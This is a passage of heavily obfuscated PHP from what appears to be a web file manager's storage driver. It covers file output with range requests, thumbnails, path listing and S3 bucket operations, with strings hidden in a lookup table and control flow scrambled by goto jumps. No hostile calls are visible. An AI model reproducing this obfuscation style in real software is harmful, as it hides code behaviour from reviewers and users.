(isset($_SERVER[$a®µÉ¸˜å‚[128]]) && strtotime($_SERVER[$a®µÉ¸˜å‚[128]]) == $A£å ĞÌÔ[$a®µÉ¸˜å‚[107]]) { header($a®µÉ¸˜å‚[129], !0, 304); die; } if (isset($_SERVER[$a®µÉ¸˜å‚[130]]) && $_SERVER[$a®µÉ¸˜å‚[130]] == $c©‰Şæİ¬) { header($a®µÉ¸˜å‚[131] . $c©‰Şæİ¬, !0, 304); die; } header($a®µÉ¸˜å‚[131] . $c©‰Şæİ¬); goto c§Ø”Úó«÷; f•¼›†Ş: if ($bÕ«ĞâÙ¯¼) { $eš®±‡Õè„ = intval(1000 * 1000 * ($F°´ÉÆÌ¦Á / $bÕ«ĞâÙ¯¼)); } while ($c––«…å‚ <= $D‹÷Ş§¯Ò) { $A¾äí˜‘ÃÙ = timeFloat(); check_abort(); $f²—×Ûà‰ = $D‹÷Ş§¯Ò - $c––«…å‚ + 1; if ($f²—×Ûà‰ <= $F°´ÉÆÌ¦Á) { $F°´ÉÆÌ¦Á = $f²—×Ûà‰; } echo $this->fileSubstr($aÑÙí¢‡àĞ, $c––«…å‚, $F°´ÉÆÌ¦Á); $c––«…å‚ += $F°´ÉÆÌ¦Á; if ($F°´ÉÆÌ¦Á == $f²—×Ûà‰) { $c––«…å‚ = $D‹÷Ş§¯Ò + 1; } if ($eš®±‡Õè„) { $bÕ³¹òÔõ  = intval(1000 * 1000 * (timeFloat() - $A¾äí˜‘ÃÙ)); $eßÔˆù„¾ = $eš®±‡Õè„ - $bÕ³¹òÔõ ; if ($eßÔˆù„¾ > 5) { usleep($eßÔˆù„¾); } } } goto e©„¹±’; aŠË–‰ãİ: $Cââ›åÔì = $A£å ĞÌÔ[$a®µÉ¸˜å‚[77]]; $AŸÙƒœÄ ‰ = gmdate($a®µÉ¸˜å‚[106], $A£å ĞÌÔ[$a®µÉ¸˜å‚[107]]); $E²¾ÅéïÏØ = $AÜ¡‘İ¸ò ? $AÜ¡‘İ¸ò : $this->iconvApp($A£å ĞÌÔ[$a®µÉ¸˜å‚[28]]); goto EÏœÁ­£Õõ; aœÀ¥¤ã¾Ê: $cáÌÌ Ù¸ = strtolower($_SERVER[$a®µÉ¸˜å‚[139]]); if ($cËê×Ô¾Š  && $cáÌÌ Ù¸ && $e ­Ñ¤íÕ÷) { if (strstr($cáÌÌ Ù¸, $a®µÉ¸˜å‚[140])) { header($a®µÉ¸˜å‚[141] . $aÑÙí¢‡àĞ); } else { if (strstr($cáÌÌ Ù¸, $a®µÉ¸˜å‚[142])) { header($a®µÉ¸˜å‚[143] . $aÑÙí¢‡àĞ); } else { if (strstr($cáÌÌ Ù¸, $a®µÉ¸˜å‚[144])) { header($a®µÉ¸˜å‚[145] . $aÑÙí¢‡àĞ); } } } if ($bÕ«ĞâÙ¯¼) { header($a®µÉ¸˜å‚[146] . $bÕ«ĞâÙ¯¼); } return; } if (isset($_SERVER[$a®µÉ¸˜å‚[147]])) { if (preg_match($a®µÉ¸˜å‚[148], $_SERVER[$a®µÉ¸˜å‚[147]], $bÂòãÇÊš¹)) { $c––«…å‚ = intval($bÂòãÇÊš¹[1]); if (!empty($bÂòãÇÊš¹[2])) { $D‹÷Ş§¯Ò = intval($bÂòãÇÊš¹[2]); } } header($a®µÉ¸˜å‚[149]); header("\x43\157\x6e\x74\145\156\x74\55\x52\141\156\x67\145\72\40\142\171\164\145\163\40{$c––«…å‚}\55{$D‹÷Ş§¯Ò}\x2f" . $Cââ›åÔì); } else { header($a®µÉ¸˜å‚[150]); } goto aÆ×á¹öÓÙ; Fá•Ä°¨§: $E™‹¿æ…æ… = get_file_mime($Eé”Ê…èÁ¶); if (strstr($E™‹¿æ…æ…, $a®µÉ¸˜å‚[114])) { $E™‹¿æ…æ… = $E™‹¿æ…æ… . $a®µÉ¸˜å‚[115]; } if ($FÙ¿©‹í¡Ù === !1 && !mime_support($E™‹¿æ…æ…)) { $FÙ¿©‹í¡Ù = !0; $E™‹¿æ…æ… = $a®µÉ¸˜å‚[116]; } goto bÎã˜¸ë; FÈ—ì†Âİí: header($a®µÉ¸˜å‚[135] . $Cââ›åÔì); header($a®µÉ¸˜å‚[136]); if (!$FÙ¿©‹í¡Ù && $Eé”Ê…èÁ¶ == $a®µÉ¸˜å‚[137]) { if ($Cââ›åÔì > 1024 * 1024 * 5) { die; } $ešˆÜî²­ = $this->getContent($aÑÙí¢‡àĞ); $ešˆÜî²­ = Html::clearSVG($ešˆÜî²­); header($a®µÉ¸˜å‚[138] . $Cââ›åÔì); echo $ešˆÜî²­; die; } goto aœÀ¥¤ã¾Ê; EÏœÁ­£Õõ: $c––«…å‚ = 0; $D‹÷Ş§¯Ò = $Cââ›åÔì - 1; $Eé”Ê…èÁ¶ = $this->ext($E²¾ÅéïÏØ); goto a’Í¤Ö†‘; Eõ²â÷”é’: @ob_end_clean(); set_timeout(); $A£å ĞÌÔ = $this->infoFull($aÑÙí¢‡àĞ); goto aŠË–‰ãİ; bÎã˜¸ë: $aÅÀÓ“²š÷ = rawurlencode($E²¾ÅéïÏØ); $aÅÀÓ“²š÷ = $a®µÉ¸˜å‚[113] . $aÅÀÓ“²š÷ . $a®µÉ¸˜å‚[117] . $aÅÀÓ“²š÷; if ($FÙ¿©‹í¡Ù) { header($a®µÉ¸˜å‚[118]); header($a®µÉ¸˜å‚[119] . $aÅÀÓ“²š÷); } else { header($a®µÉ¸˜å‚[120] . $aÅÀÓ“²š÷); } goto bÏØà•†ø½; c§Ø”Úó«÷: header($a®µÉ¸˜å‚[132] . $AŸÙƒœÄ ‰ . $a®µÉ¸˜å‚[124]); header($a®µÉ¸˜å‚[133] . $E²¾ÅéïÏØ); header($a®µÉ¸˜å‚[134]); goto FÈ—ì†Âİí; bÏØà•†ø½: header($a®µÉ¸˜å‚[121]); header($a®µÉ¸˜å‚[122] . $E™‹¿æ…æ…); header($a®µÉ¸˜å‚[123] . gmdate($a®µÉ¸˜å‚[106], time() + 3600 * 24 * 30) . $a®µÉ¸˜å‚[124]); goto cÛùˆà¡ƒ; E§ÅÛµÒ£í: if ($_SERVER[$a®µÉ¸˜å‚[154]] == $a®µÉ¸˜å‚[155]) { return; } $F°´ÉÆÌ¦Á = 1024 * 100; $eš®±‡Õè„ = 0; goto f•¼›†Ş; cÛùˆà¡ƒ: header($a®µÉ¸˜å‚[125]); header($a®µÉ¸˜å‚[126]); header($a®µÉ¸˜å‚[127]); goto EáŠÚÆñä§; aÆ×á¹öÓÙ: $eÎĞãìÂç = !0; if ($_SERVER[$a®µÉ¸˜å‚[151]] == $a®µÉ¸˜å‚[152] && $Cââ›åÔì > 1204 * 1024 * 1024 * 2) { $eÎĞãìÂç = !1; } if ($eÎĞãìÂç) { header($a®µÉ¸˜å‚[153] . ($D‹÷Ş§¯Ò - $c––«…å‚ + 1)); } goto E§ÅÛµÒ£í; a’Í¤Ö†‘: if (in_array($Eé”Ê…èÁ¶, array($a®µÉ¸˜å‚[108], $a®µÉ¸˜å‚[109], $a®µÉ¸˜å‚[110], $a®µÉ¸˜å‚[111]))) { $Eé”Ê…èÁ¶ = $a®µÉ¸˜å‚[112]; } if (!$c©‰Şæİ¬) { $c©‰Şæİ¬ = md5($AŸÙƒœÄ ‰ . $this->hashSimple($aÑÙí¢‡àĞ)); } $c©‰Şæİ¬ = $a®µÉ¸˜å‚[113] . $c©‰Şæİ¬ . $a®µÉ¸˜å‚[113]; goto Fá•Ä°¨§; e©„¹±’: } public function fileOutServer($e›‹°â¤‹®, $bö±˜„Õ«Ù = false, $d”ª½ÕìÃŠ = false, $eªñ¹„¤Ô = '') { $this->fileOut($e›‹°â¤‹®, $bö±˜„Õ«Ù, $d”ª½ÕìÃŠ, $eªñ¹„¤Ô); } public function fileOutLink($f«°¾’í‡) { header($_SERVER[…Ò×–][156] . $f«°¾’í‡); die; } public function cacheMethod($c±–õ×”Á‚, $bÜÒõÙ Ó) { goto FÜ°’¤ÒĞè; FÜ°’¤ÒĞè: $BÆ‘Œ°ÕŸ† =& $_SERVER[…Ò×–]; static $cí¬ »õ†é = array(); $E‰Éà´ê† = $bÜÒõÙ Ó ? ltrim($this->getPathOuter($bÜÒõÙ Ó), $BÆ‘Œ°ÕŸ†[8]) : $bÜÒõÙ Ó; goto DÃãÒË‚˜õ; DÃãÒË‚˜õ: $aÎ÷øõñ = $BÆ‘Œ°ÕŸ†[157] . $c±–õ×”Á‚ . $BÆ‘Œ°ÕŸ†[158] . rtrim($E‰Éà´ê†, $BÆ‘Œ°ÕŸ†[8]); if (is_null($c±–õ×”Á‚)) { $cí¬ »õ†é = array(); return; } if (is_null($bÜÒõÙ Ó)) { unset($cí¬ »õ†é[$aÎ÷øõñ]); return; } goto FŒ«ëóÊŠğ; FŒ«ëóÊŠğ: $Ešé»ƒøœ = isset($cí¬ »õ†é[$aÎ÷øõñ]) ? $cí¬ »õ†é[$aÎ÷øõñ] : null; if (!is_null($Ešé»ƒøœ)) { return $Ešé»ƒøœ; } $Ešé»ƒøœ = $this->{$c±–õ×”Á‚}($bÜÒõÙ Ó); goto CùŞ·˜µš™; CùŞ·˜µš™: $cí¬ »õ†é[$aÎ÷øõñ] = $Ešé»ƒøœ; return $Ešé»ƒøœ; goto Eôç•è¡; Eôç•è¡: } public function fileOutImage($eìº½èëñÆ, $Dàˆ¢« = 250) { goto BÂ†ÔáÌ‘¾; Bª§ë‚—‰: $D—”øŒÛ = DATA_THUMB . $d¿ìî ÆªÑ; del_file($D—”øŒÛ); if (!@file_exists($D—”øŒÛ)) { $Dùº—©Ü„È = TEMP_FILES; if (!is_dir($Dùº—©Ü„È)) { mk_dir($Dùº—©Ü„È); } $f„ç±™¬ä = $Dùº—©Ü„È . $CÀì‘‡ã†õ . $e’¯ŞÈŒÅ[91] . $føÊêáĞ¤£[$e’¯ŞÈŒÅ[165]]; if (!@file_exists($f„ç±™¬ä)) { $f„ç±™¬ä = $this->download($eìº½èëñÆ, $f„ç±™¬ä); } $EµÄ—Š¢·Ö = new ImageThumb($f„ç±™¬ä, $e’¯ŞÈŒÅ[171]); $EµÄ—Š¢·Ö->prorate($D—”øŒÛ, $Dàˆ¢«, $Dàˆ¢« * 10); } goto DÄ‘‚£æì; DÄ‘‚£æì: if (!file_exists($D—”øŒÛ) || filesize($D—”øŒÛ) < 100) { return @file_exists($f„ç±™¬ä) ? IO::fileOut($f„ç±™¬ä) : $this->fileOut($eìº½èëñÆ); } if (!($C‹õÎå²¬ = IO::move($D—”øŒÛ, $bèˆÀÃò‚ä))) { return IO::fileOut($D—”øŒÛ); } del_file($D—”øŒÛ); goto BÏšá†¥‰ø; BÂ†ÔáÌ‘¾: $e’¯ŞÈŒÅ =& $_SERVER[…Ò×–]; if (substr($eìº½èëñÆ, 0, 4) == $e’¯ŞÈŒÅ[144]) { $this->fileOutLink($eìº½èëñÆ); } $føÊêáĞ¤£ = $this->info($eìº½èëñÆ); goto aŸËÕ‡íõœ; aŸËÕ‡íõœ: $AÓ´©áÁ‹Ô = $føÊêáĞ¤£[$e’¯ŞÈŒÅ[28]]; $fè¨¿¹ì‡ß = !1; if (isset($GLOBALS[$e’¯ŞÈŒÅ[159]]) && $GLOBALS[$e’¯ŞÈŒÅ[159]][$e’¯ŞÈŒÅ[75]] == $føÊêáĞ¤£[$e’¯ŞÈŒÅ[75]]) { $dÏ°¼ºï£ = $GLOBALS[$e’¯ŞÈŒÅ[159]][$e’¯ŞÈŒÅ[160]]; if (!$føÊêáĞ¤£[$e’¯ŞÈŒÅ[161]]) { $føÊêáĞ¤£[$e’¯ŞÈŒÅ[161]] = $GLOBALS[$e’¯ŞÈŒÅ[159]]; } if (isset($dÏ°¼ºï£[$e’¯ŞÈŒÅ[162]])) { if ($dÏ°¼ºï£[$e’¯ŞÈŒÅ[162]] <= $Dàˆ¢« && $dÏ°¼ºï£[$e’¯ŞÈŒÅ[163]] <= $Dàˆ¢«) { $fè¨¿¹ì‡ß = !0; } } $AÓ´©áÁ‹Ô = $føÊêáĞ¤£[$e’¯ŞÈŒÅ[161]][$e’¯ŞÈŒÅ[28]]; } goto cñ®×ˆïÍ; DÀŒ»¹Ô…: if (!($b¥˜Š²ïì = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $e’¯ŞÈŒÅ[169]))) { $bèˆÀÃò‚ä = IO::mkdir(IO_PATH_SYSTEM_TEMP . $e’¯ŞÈŒÅ[170]); } else { $bèˆÀÃò‚ä = KodIO::make($b¥˜Š²ïì); } if ($b¥˜Š²ïì = IO::fileNameExist($bèˆÀÃò‚ä, $d¿ìî ÆªÑ)) { $D—”øŒÛ = KodIO::make($b¥˜Š²ïì); return IO::fileOut($D—”øŒÛ, !1, $AÓ´©áÁ‹Ô); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto Bª§ë‚—‰; cñ®×ˆïÍ: if ($føÊêáĞ¤£[$e’¯ŞÈŒÅ[77]] <= 1024 * 50 || $fè¨¿¹ì‡ß || !function_exists($e’¯ŞÈŒÅ[164]) || $føÊêáĞ¤£[$e’¯ŞÈŒÅ[165]] == $e’¯ŞÈŒÅ[166]) { return $this->fileOut($eìº½èëñÆ, !1, $AÓ´©áÁ‹Ô); } if (isset($føÊêáĞ¤£[$e’¯ŞÈŒÅ[161]][$e’¯ŞÈŒÅ[167]])) { $CÀì‘‡ã†õ = $føÊêáĞ¤£[$e’¯ŞÈŒÅ[161]][$e’¯ŞÈŒÅ[167]]; } else { if (isset($føÊêáĞ¤£[$e’¯ŞÈŒÅ[161]][$e’¯ŞÈŒÅ[168]])) { $CÀì‘‡ã†õ = $føÊêáĞ¤£[$e’¯ŞÈŒÅ[161]][$e’¯ŞÈŒÅ[168]]; } else { $CÀì‘‡ã†õ = md5("{$føÊêáĞ¤£[$e’¯ŞÈŒÅ[28]]}\137{$føÊêáĞ¤£[$e’¯ŞÈŒÅ[75]]}\137{$føÊêáĞ¤£[$e’¯ŞÈŒÅ[77]]}"); } } $d¿ìî ÆªÑ = "{$CÀì‘‡ã†õ}\137{$Dàˆ¢«}\x2e\x70\x6e\147"; goto DÀŒ»¹Ô…; BÏšá†¥‰ø: IO::fileOut($C‹õÎå²¬); goto B†¶ùá®Æ÷; B†¶ùá®Æ÷: } public function fileOutImageServer($AƒÃ©Õ°¦¿, $fßÀìÎ‹Ó  = 250) { $this->fileOutImage($AƒÃ©Õ°¦¿, $fßÀìÎ‹Ó ); } public function fileNameAuto($E×ğÀ¢ ñ, $eÎº×¯³¡–, $A¼õÃšöÕ = REPEAT_RENAME, $Aãºé¹„Œ = false) { goto BİµÀ˜é—â; dàŒÂ‰“çŞ: $c˜‚—ó‡ = 1; $Fæ¥Õê¶á– = substr($eÎº×¯³¡–, 0, strlen($eÎº×¯³¡–) - strlen($dÀëÁŠ³Û‰)); $DÀëáÍò…™ = $Fæ¥Õê¶á– . "\50{$c˜‚—ó‡}\51{$dÀëÁŠ³Û‰}"; goto a„Òï™¼Õ˜; BİµÀ˜é—â: $eŞÅÚŒğÜ” =& $_SERVER[…Ò×–]; $a£ÆáĞ‰Ì­ = $E×ğÀ¢ ñ === $eŞÅÚŒğÜ”[33] ? $eÎº×¯³¡– : rtrim($E×ğÀ¢ ñ, $eŞÅÚŒğÜ”[8]) . $eŞÅÚŒğÜ”[8] . $eÎº×¯³¡–; if ($A¼õÃšöÕ == REPEAT_REPLACE || !$this->exist($a£ÆáĞ‰Ì­) || $Aãºé¹„Œ && $A¼õÃšöÕ != REPEAT_RENAME_FOLDER) { return $eÎº×¯³¡–; } goto Aö·‡¨õŠÂ; a„Òï™¼Õ˜: while ($this->exist(rtrim($E×ğÀ¢ ñ, $eŞÅÚŒğÜ”[8]) . $eŞÅÚŒğÜ”[8] . $DÀëáÍò…™)) { $DÀëáÍò…™ = $Fæ¥Õê¶á– . "\50{$c˜‚—ó‡}\x29{$dÀëÁŠ³Û‰}"; $c˜‚—ó‡++; } return $DÀëáÍò…™; goto Dº‚â†ç¦¤; Aö·‡¨õŠÂ: if ($A¼õÃšöÕ == REPEAT_SKIP) { return !1; } $dÀëÁŠ³Û‰ = $eŞÅÚŒğÜ”[91] . get_path_ext($eÎº×¯³¡–); $dÀëÁŠ³Û‰ = $dÀëÁŠ³Û‰ == $eŞÅÚŒğÜ”[91] || $Aãºé¹„Œ ? $eŞÅÚŒğÜ”[33] : $dÀëÁŠ³Û‰; goto dàŒÂ‰“çŞ; Dº‚â†ç¦¤: } public function listAllFiles($B×÷·œŠ—è, $Aè…²Á«›Ú, $cÓÃ‹†¥‰¦ = array()) { goto b¢ï õ¬‡Ÿ; AÂ«Ü†Îã: $B×÷·œŠ—è = trim($B×÷·œŠ—è, $bå”÷÷ù¡’[8]); foreach ($Aè…²Á«›Ú as $E·‚‚¿ÍÙé) { $aÈŒÍÒ”¹Ÿ = ltrim(substr($E·‚‚¿ÍÙé, strlen($B×÷·œŠ—è)), $bå”÷÷ù¡’[8]); $FÑ©ßñø»Æ = array_merge($FÑ©ßñø»Æ, $this->slicePath($aÈŒÍÒ”¹Ÿ)); } $FøÚ¹Â§Ëµ = array(); goto d´É÷¯¨Éó; b¢ï õ¬‡Ÿ: $bå”÷÷ù¡’ =& $_SERVER[…Ò×–]; if (empty($Aè…²Á«›Ú)) { return array(); } $FÑ©ßñø»Æ = array(); goto AÂ«Ü†Îã; d´É÷¯¨Éó: foreach (array_unique($FÑ©ßñø»Æ) as $E·‚‚¿ÍÙé) { $Cïà¥³…«Î = array($bå”÷÷ù¡’[75] => $this->getPathOuter($bå”÷÷ù¡’[8] . $B×÷·œŠ—è . $bå”÷÷ù¡’[8] . $E·‚‚¿ÍÙé), $bå”÷÷ù¡’[76] => 1, $bå”÷÷ù¡’[77] => 0); if (substr($E·‚‚¿ÍÙé, -1) != $bå”÷÷ù¡’[8]) { $Cïà¥³…«Î[$bå”÷÷ù¡’[76]] = 0; $c²ç°±À = $this->getPath($B×÷·œŠ—è . $bå”÷÷ù¡’[8] . $E·‚‚¿ÍÙé); $Cïà¥³…«Î[$bå”÷÷ù¡’[77]] = isset($cÓÃ‹†¥‰¦[$c²ç°±À]) ? $cÓÃ‹†¥‰¦[$c²ç°±À] : $this->size($c²ç°±À); } $FøÚ¹Â§Ëµ[] = $Cïà¥³…«Î; } return $FøÚ¹Â§Ëµ; goto E–ĞÍÄ­Ê¸; E–ĞÍÄ­Ê¸: } public function slicePath($Eàˆ‚êªŸà) { $EäÔô­ñ‘Í =& $_SERVER[…Ò×–]; $F“£®Íï¸ = explode($EäÔô­ñ‘Í[8], trim($Eàˆ‚êªŸà, $EäÔô­ñ‘Í[8])); $DÁ—îÎÏÜ’ = 0; do { ++$DÁ—îÎÏÜ’; $E„Ô°­ÅƒÊ[] = implode($EäÔô­ñ‘Í[8], array_slice($F“£®Íï¸, 0, $DÁ—îÎÏÜ’)) . $EäÔô­ñ‘Í[8]; } while ($DÁ—îÎÏÜ’ < count($F“£®Íï¸)); $E„Ô°­ÅƒÊ[count($F“£®Íï¸) - 1] = $Eàˆ‚êªŸà; return $E„Ô°­ÅƒÊ; } public function getHost() { $bç‰‚“´¥ =& $_SERVER[…Ò×–]; $f¼®¶”¼à = parse_url(trim($this->domain, $bç‰‚“´¥[8])); $eçÉ®™…½Ï = isset($f¼®¶”¼à[$bç‰‚“´¥[172]]) ? $f¼®¶”¼à[$bç‰‚“´¥[172]] : http_type(); $c¼É…çäšç = isset($f¼®¶”¼à[$bç‰‚“´¥[173]]) ? $f¼®¶”¼à[$bç‰‚“´¥[173]] : $f¼®¶”¼à[$bç‰‚“´¥[75]]; if (isset($f¼®¶”¼à[$bç‰‚“´¥[174]])) { $c¼É…çäšç .= $bç‰‚“´¥[4] . $f¼®¶”¼à[$bç‰‚“´¥[174]]; } return $eçÉ®™…½Ï . $bç‰‚“´¥[175] . $c¼É…çäšç; } public function pathEncode($cÏŒ±Îƒë·) { $DÚ©ÇÎ«Âª =& $_SERVER[…Ò×–]; return str_replace($DÚ©ÇÎ«Âª[176], $DÚ©ÇÎ«Âª[8], rawurlencode($cÏŒ±Îƒë·)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($f¤‡ÀˆÄã„) { set_timeout(); require_once SDK_DIR . $_SERVER[…Ò×–][177]; parent::__construct(); $this->_init($f¤‡ÀˆÄã„); } public function _init($D¦•Îïƒß¤) { foreach ($D¦•Îïƒß¤ as $AóãŸ“…å¾ => $Fø÷÷§˜’) { if (isset($this->{$AóãŸ“…å¾})) { $this->{$AóãŸ“…å¾} = $Fø÷÷§˜’; } } $this->endpoint = $D¦•Îïƒß¤[$_SERVER[…Ò×–][178]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($aÉ½†õ÷â¯ = "\166\64") { $this->signVer = $aÉ½†õ÷â¯; $this->client->setSignatureVersion($aÉ½†õ÷â¯); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto BçŠ¹ºôŞ; cÈ½”ôÑöĞ: $DÁÅƒô›„ñ = array($FÏãÙˆéó[184], $FÏãÙˆéó[185], $FÏãÙˆéó[186], $FÏãÙˆéó[187], $FÏãÙˆéó[188]); $BÍ—îµ›ó = array_diff($DÁÅƒô›„ñ, $fªìôŸ®ó¨); return empty($BÍ—îµ›ó); goto e¤óÛâñŒª; BçŠ¹ºôŞ: $FÏãÙˆéó =& $_SERVER[…Ò×–]; $EÙì´õİù = $this->getBucketCors(); if (!$EÙì´õİù || !is_array($EÙì´õİù)) { return !1; } goto c¹ˆºœ§É½; c¹ˆºœ§É½: if ($EÙì´õİù[$FÏãÙˆéó[179]] != $FÏãÙˆéó[180] || $EÙì´õİù[$FÏãÙˆéó[181]] != $FÏãÙˆéó[180]) { return !1; } $fªìôŸ®ó¨ = array_map($FÏãÙˆéó[182], $EÙì´õİù[$FÏãÙˆéó[183]]); if (!is_array($fªìôŸ®ó¨)) { $fªìôŸ®ó¨ = array(); } goto cÈ½”ôÑöĞ; e¤óÛâñŒª: } public function mkfile($dã›¿ßø‹É, $f¢¢íà¾Ã = '', $DºÎ‹‚ß‘Æ = REPEAT_RENAME) { $dÆ©˜ƒš§ = $this->setContent($dã›¿ßø‹É, $f¢¢íà¾Ã); if ($dÆ©˜ƒš§ !== !1) { return $this->getPathOuter($dã›¿ßø‹É); } return !1; } public function mkdir($C²‚‹ßò‹, $DÀŠ¾¹˜¶× = REPEAT_SKIP) { if (empty($C²‚‹ßò‹)) { return !1; } if ($this->_isFolder($C²‚‹ßò‹)) { return $this->getPathOuter($C²‚‹ßò‹); } $DĞãĞĞåæÌ = $this->setContent($C²‚‹ßò‹, $_SERVER[…Ò×–][33], !0); if ($DĞãĞĞåæÌ !== !1) { return $this->getPathOuter($C²‚‹ßò‹); } return !1; } public function copyFile($bŒÂÌ•ğò­, $FÓ‘ñÉ„—½, $d¾ËñÍí®¯ = array()) { $E²¼˜ùï£ =& $_SERVER[…Ò×–]; $CÈ¦Û¡¸Ü = $this->objectMeta($bŒÂÌ•ğò­); if (!$CÈ¦Û¡¸Ü) { return !1; } if ($CÈ¦Û¡¸Ü[$E²¼˜ùï£[77]] <= 1024 * 1024 * 200) { $d‹„‰°ğš³ = $this->client->copyObject($this->bucket, $bŒÂÌ•ğò­, $this->bucket, $FÓ‘ñÉ„—½, $E²¼˜ùï£[189], $d¾ËñÍí®¯); } else { $d‹„‰°ğš³ = $this->client->multiCopyObject($this->bucket, $bŒÂÌ•ğò­, $this->bucket, $FÓ‘ñÉ„—½, $d¾ËñÍí®¯); } $d‹„‰°ğš³ = $d‹„‰°ğš³ ? $this->getPathOuter($FÓ‘ñÉ„—½) : !1; return $d‹„‰°ğš³; } public function moveFile($aéİÕ»Ùâî, $b·‹ñè“êß) { if ($this->copyFile($aéİÕ»Ùâî, $b·‹ñè“êß)) { $this->delFile($aéİÕ»Ùâî); return $this->getPathOuter($b·‹ñè“êß); } return !1; } public function delFile($Cë¹İï…³) { return $this->client->deleteObject($this->bucket, $Cë¹İï…³); } public function delFolder($C„²œâ¦º³) { goto cÜ«ªï ˜; FäÕ¼ÒØâ: return $b›Àæá³š³ === $dÀğ×Š¨‚¼ ? !0 : !1; goto aÃœÜø›õÜ; c®¼œ‰Šé©: $b›Àæá³š³ = $dÀğ×Š¨‚¼ = 0; $càƒ¶é¦ÄÑ = array_chunk(array_keys($e¤ĞªÑ‹), 1000); foreach ($càƒ¶é¦ÄÑ as $F·À»¾–Õ) { $b›Àæá³š³++; $dÀğ×Š¨‚¼ += (int) $this->client->deleteObjects($this->bucket, $F·À»¾–Õ); } goto FäÕ¼ÒØâ; cÜ«ªï ˜: $AÌ®‹Çé¯ò =& $_SERVER[…Ò×–]; $e¤ĞªÑ‹ = $this->listObjs($C„²œâ¦º³); if (!$e¤ĞªÑ‹) { $C„²œâ¦º³ = trim($C„²œâ¦º³, $AÌ®‹Çé¯ò[8]); if (!empty($C„²œâ¦º³)) { $C„²œâ¦º³ .= $AÌ®‹Çé¯ò[8]; } return $this->delFile($C„²œâ¦º³); } goto c®¼œ‰Šé©; aÃœÜø›õÜ: } public function rename($cŒ¯è®ÍÒ, $AöÎ±—ñ) { return $this->renameObject($cŒ¯è®ÍÒ, $AöÎ±—ñ); } public function listPath($EˆË†¢ÙÉ, $c¼ù¬³İáç = false) { $c”‡–êˆÅ¡ =& $_SERVER[…Ò×–]; $BÓäŒ®„– = $this->listObjs($EˆË†¢ÙÉ, null, null, $c”‡–êˆÅ¡[8]); $c×¹™‚šÖ¯ = array($c”‡–êˆÅ¡[74] => array(), $c”‡–êˆÅ¡[73] => array()); foreach ($BÓäŒ®„– as $BÅœ¡Ÿ¸­ => $CÌòéÌâŸì) { if ($BÅœ¡Ÿ¸­ == $c”‡–êˆÅ¡[8]) { continue; } if (isset($CÌòéÌâŸì[$c”‡–êˆÅ¡[190]])) { $c×¹™‚šÖ¯[$c”‡–êˆÅ¡[74]][] = $this->folderInfo($CÌòéÌâŸì[$c”‡–êˆÅ¡[190]], $c¼ù¬³İáç); } else { if (substr($CÌòéÌâŸì[$c”‡–êˆÅ¡[28]], -1) == $c”‡–êˆÅ¡[8]) { continue; } $c×¹™‚šÖ¯[$c”‡–êˆÅ¡[73]][] = $this->fileInfo($CÌòéÌâŸì[$c”‡–êˆÅ¡[28]], $c¼ù¬³İáç, $CÌòéÌâŸì); } } return $c×¹™‚šÖ¯; } private function fileInfo($CÎãäÃ’‰, $Fõİ‹¬´Ä = false, $CÊ…ÌËÚ£Å = array()) { goto cÀÀİ–ØïÏ; cÒ«Ò¢ê ‡: return $ağ•à”†¿; goto fÏ¡ì’¥¿; D­Èô‰Å°: if (empty($CÊ…ÌËÚ£Å)) { $CÊ…ÌËÚ£Å = $this->objectMeta($CÎãäÃ’‰); if (!$CÊ…ÌËÚ£Å) { return $ağ•à”†¿; } } if (isset($CÊ…ÌËÚ£Å[$EÓ¾¹·•[194]])) { $ağ•à”†¿[$EÓ¾¹·•[107]] = $CÊ…ÌËÚ£Å[$EÓ¾¹·•[194]]; } if (isset($CÊ…ÌËÚ£Å[$EÓ¾¹·•[77]])) { $ağ•à”†¿[$EÓ¾¹·•[77]] = $CÊ…ÌËÚ£Å[$EÓ¾¹·•[77]]; } goto cÒ«Ò¢ê ‡; cÀÀİ–ØïÏ: $EÓ¾¹·• =& $_SERVER[…Ò×–]; if ($Fõİ‹¬´Ä) { return array($EÓ¾¹·•[28] => $this->pathThis($CÎãäÃ’‰), $EÓ¾¹·•[75] => $this->getPathOuter($CÎãäÃ’‰), $EÓ¾¹·•[29] => $EÓ¾¹·•[171], $EÓ¾¹·•[165] => $this->ext($CÎãäÃ’‰), $EÓ¾¹·•[77] => isset($CÊ…ÌËÚ£Å[$EÓ¾¹·•[77]]) ? $CÊ…ÌËÚ£Å[$EÓ¾¹·•[77]] : 0, $EÓ¾¹·•[191] => 0, $EÓ¾¹·•[107] => 0, $EÓ¾¹·•[192] => !0, $EÓ¾¹·•[193] => !0); } $ağ•à”†¿ = array($EÓ¾¹·•[28] => $this->pathThis($CÎãäÃ’‰), $EÓ¾¹·•[75] => $this->getPathOuter($CÎãäÃ’‰), $EÓ¾¹·•[29] => $EÓ¾¹·•[171], $EÓ¾¹·•[191] => 0, $EÓ¾¹·•[107] => 0, $EÓ¾¹·•[77] => 0, $EÓ¾¹·•[165] => $this->ext($CÎãäÃ’‰), $EÓ¾¹·•[192] => !0, $EÓ¾¹·•[193] => !0); goto D­Èô‰Å°; fÏ¡ì’¥¿: } private function folderInfo($B™ö÷—¢ïÌ, $FÙ³¬ŠÄ• = false) { goto C®‘•Üˆœ‹; c•í’Ö¦¸¸: if (isset($Dà‰Œò¿‡«[$b˜¡ÎÇÇ©†[194]])) { $AˆÙ‹­½†[$b˜¡ÎÇÇ©†[191]] = $Dà‰Œò¿‡«[$b˜¡ÎÇÇ©†[194]]; } return $AˆÙ‹­½†; goto a´ùøññ¤Š; dê­›¸ÜÑ: if ($B™ö÷—¢ïÌ == $b˜¡ÎÇÇ©†[33]) { return $AˆÙ‹­½†; } $B™ö÷—¢ïÌ = trim($B™ö÷—¢ïÌ, $b˜¡ÎÇÇ©†[8]) . $b˜¡ÎÇÇ©†[8]; $Dà‰Œò¿‡« = $this->objectMeta($B™ö÷—¢ïÌ); goto c•í’Ö¦¸¸; C®‘•Üˆœ‹: $b˜¡ÎÇÇ©† =& 